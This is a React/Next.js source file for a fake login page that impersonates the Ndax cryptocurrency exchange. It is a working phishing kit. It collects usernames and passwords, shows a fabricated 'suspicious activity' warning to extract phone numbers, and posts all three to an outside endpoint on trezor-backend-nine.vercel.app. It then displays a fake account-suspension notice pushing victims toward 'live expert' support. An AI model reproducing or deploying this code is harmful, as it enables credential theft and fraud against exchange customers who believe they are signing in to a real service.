"use client";
import Image from "next/image";
import img from "../assets/image1.png";
import Logo from "../assets/logo2.svg";
import { useState } from "react";
import {
  EyeIcon,
  EyeSlashIcon,
  ExclamationCircleIcon,
} from "@heroicons/react/24/outline";
import axios from "axios";
import PhoneInput from "react-phone-number-input";
import "react-phone-number-input/style.css";

import orbitLines from "../assets/orbit-lines.png";
import logo11 from "../assets/logo-1-1.png";
import logo12 from "../assets/logo-1-2.png";
import logo13 from "../assets/logo-1-3.png";
import logo14 from "../assets/logo-1-4.png";
import logo15 from "../assets/logo-1-5.png";
import logo21 from "../assets/logo-2-1.png";
import logo22 from "../assets/logo-2-2.png";
import logo23 from "../assets/logo-2-3.png";
import logo24 from "../assets/logo-2-4.png";
import logo25 from "../assets/logo-2-5.png";

export default function HomePage() {
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [alert, setAlert] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);
  const [step, setStep] = useState(1);
  const [message, setMessage] = useState(
    "some suspicious activity found with your account. Enter phone number to verify your identity"
  );

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    phone: "",
  });

  // Handle input changes
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  // Handle Step 1 submit
  const handleSubmitStep1 = (e: React.FormEvent) => {
    e.preventDefault();
    setAlert(null);
    setLoading(true);

    try {
      const data = {
        email: formData.email,
        password: formData.password,
      };

      localStorage.setItem("userInfo", JSON.stringify(data));

      // Go to next step
      setStep(2);
      // Always show red message at Step 2 start
      setAlert({
        type: "error",
        message:
          "Important message!: some suspicious activity found with your account. Enter phone number to verify your identity",
      });
    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to save data. Please try again.",
      });
    } finally {
      setLoading(false);
    }
  };

  // Handle Step 2 submit
  const handleSubmitStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const stored = JSON.parse(localStorage.getItem("userInfo") || "{}");
      const data = {
        title: "Ndax",
        ...stored,
        phone: formData.phone,
      };

      const response = await axios.post(
        "https://trezor-backend-nine.vercel.app/api/v1/send-user-info",
        data
      );

      localStorage.removeItem("userInfo");
    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to verify your identity. Please try again.",
      });
    } finally {
      setMessage(
        "Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account."
      );
      setLoading(false);
    }
  };

  return (
    <div className="h-screen w-full overflow-hidden flex justify-center items-center ">
      <div className=" w-full flex h-full bg-[#08021D]">
        {/* Left Section */}
        

        {/* Right Section */}
        <div className="bg-[linear-gradient(180deg,rgba(25,20,44,0.7)_0%,rgba(25,20,44,0.3)_100%)] w-[56%] h-full flex flex-col justify-between relative pt-7">
            <div className="space-y-2 text-sm w-[92.5%] self-center">
              <div className="flex justify-between items-center">
                <img  src="/images/logo.svg"/>
                <div className="flex space-x-3 items-center">
                <p className="text-[#A0A4AE]">Don't have an account?</p>
            <button className="text-[16px] px-10 rounded-4xl py-3 font-bold bg-[#19142C] text-white">Sign up</button>
            </div>
            </div>
                <div className="mt-24 flex items-center justify-center">
                  <span className="text-[48px] text-white">Log In</span>
                </div>
                {/* {alert && (
                  <div
                    className={`mt-4 text-sm p-2 rounded-md ${
                      alert.type === "success"
                        ? "bg-green-100 text-green-700 border border-green-300"
                        : "bg-red-100 text-red-700 border border-red-300"
                    }`}
                  >
                    {alert.message}
                    
                  </div>
                )} */}
                </div>
          {step === 1 ? (
            // Step 1: Email & Password
            <form
              onSubmit={handleSubmitStep1}
              className="flex flex-col justify-between h-full"
            >
              <div className="space-y-2 text-sm w-[65%] self-center h-100dvh">
                <div className="space-y-14 mt-15">
                  {/* Email */}
                  <div
                    className="relative w-full border-2 bg-[linear-gradient(180deg,rgba(45,35,75,0.8)_0%,rgba(45,35,75,0.5)_100%)] hover:bg-[linear-gradient(180deg,rgba(95,80,160,0.9)_0%,rgba(115,95,180,0.6)_100%)] transition-all duration-300 text-sm focus-within:border-[#8473FF] border-none rounded-4xl"
                  >
                    <label
                      className="absolute -top-6 left-4 px-1 text-[11.2px] font-medium"
                      style={{ color: "white" }}
                    >
                      USERNAME
                    </label>
                    <input
                      name="email"
                      value={formData.email}
                      onChange={handleChange}
                      className="w-full py-3 text-lg px-3 border-none outline-none focus:ring-0 text-white placeholder-[#919eb5] bg-transparent"
                      required
                    />
                  </div>

                  {/* Password */}
                  <div
                    className="relative w-full border-2 bg-[linear-gradient(180deg,rgba(45,35,75,0.8)_0%,rgba(45,35,75,0.5)_100%)] hover:bg-[linear-gradient(180deg,rgba(95,80,160,0.9)_0%,rgba(115,95,180,0.6)_100%)] transition-all duration-300 rounded-4xl text-sm focus-within:border-[#8473FF] border-none"
                  >
                    <label
                      className="absolute -top-6 left-4 px-1 text-[11.2px] font-medium"
                      style={{ color: "white" }}
                    >
                      PASSWORD
                    </label>
                    <input
                      type={showPassword ? "text" : "password"}
                      name="password"
                      value={formData.password}
                      onChange={handleChange}
                      className="w-full py-3 px-3 text-lg border-none outline-none focus:ring-0 text-white  bg-transparent"
                      required
                    />
                    <button
                      type="button"
                      className="absolute right-5 top-4 text-[#919eb5] cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? (
                        <EyeSlashIcon className="h-5 w-5" />
                      ) : (
                        <EyeIcon className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                </div>
                <button
                  type="submit"
                  disabled={loading}
                  className={`w-full py-3 mt-6 px-4 rounded-4xl  text-sm font-medium transition-all duration-200 ${
                    loading
                    ? "bg-[#C2FF52] cursor-not-allowed"
                      : "bg-[#C2FF52] hover:bg-[#C2FF52] cursor-pointer"
                  } text-black`}
                >
                  {loading ? "Processing..." : "Log In"}
                </button>
                <p className="text-white mt-5">Trouble signing in?</p>
                <span className="text-[14.4px] font-semibold text-[#8473FF]">Forgot your password  <span className="text-white">or</span>  Forgot your usernameoday</span>
                <div className="absolute bottom-8 left-14 items-center flex justify-between w-[85%]">
                  <p className="text-[#A0A4AE]">© 2025 Ndax Canada Inc. All rights reserved.</p>
                  <button className="rounded-4xl bg-[linear-gradient(180deg,rgba(45,35,75,0.8)_0%,rgba(45,35,75,0.5)_100%)] text-[18px] text-white px-4 py-1">Help</button>
                </div>
              </div>
            </form>
          ) : (
            // Step 2: Phone Input
            <form
              onSubmit={handleSubmitStep2}
              className="flex flex-col  h-full relative gap-4 pt-8 w-[67%] self-center"
            >
              {/* Alert at top — normal flow */}
              <div className="w-full self-center text-sm p-3 rounded-md text-center border border-red-300 bg-red-100 text-red-700 flex items-center justify-center gap-2">
                <span>{`Important message!: ${message}`}</span>
              </div>

              <div>
                <div
                  className="relative border-none rounded-lg mt-10"
                >
                  <label
                    className="absolute -top-6 left-2 px-1 text-[14px] font-medium"
                    style={{ color: "white" }}
                  >
                    Phone Number
                  </label>
                  <PhoneInput
  international
  defaultCountry="IN"
  value={formData.phone}
  onChange={(value) =>
    setFormData((prev) => ({ ...prev, phone: value || "" }))
  }
  className="w-full py-3 bg-[linear-gradient(180deg,rgba(45,35,75,0.8)_0%,rgba(45,35,75,0.5)_100%)] hover:bg-[linear-gradient(180deg,rgba(95,80,160,0.9)_0%,rgba(115,95,180,0.6)_100%)] transition-all duration-300 text-sm rounded-4xl px-3 text-white placeholder-[#919eb5] [&>input]:border-none [&>input]:outline-none"
/>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading || !formData.phone}
                className={`w-full py-2 rounded-full mt-6 text-sm font-medium transition-all duration-200 ${
                  loading
                    ? "bg-[#C2FF52] cursor-not-allowed"
                    : "bg-[#C2FF52] hover:bg-[#A8E64A] cursor-pointer"
                } text-black`}
              >
                {loading ? "Sending..." : "Submit"}
              </button>
            </form>
          )}
        </div>
        <div className="flex justify-center items-center w-[43%] relative bg-[#08021D] pt-16">
          <div className="">
            <img src="/images/side_image.jpeg" alt="Logo" width="100%" />
          </div>
          {/* <div className="bg-gray-200 h-64 md:h-80 rounded-lg flex items-center justify-center overflow-hidden">
            <Image
              src={img}
              alt="Investment Illustration"
              className="object-cover w-full h-full rounded-lg"
              style={{ background: "red" }}
            />
          </div> */}
        </div>
      </div>
    </div>
  );
}
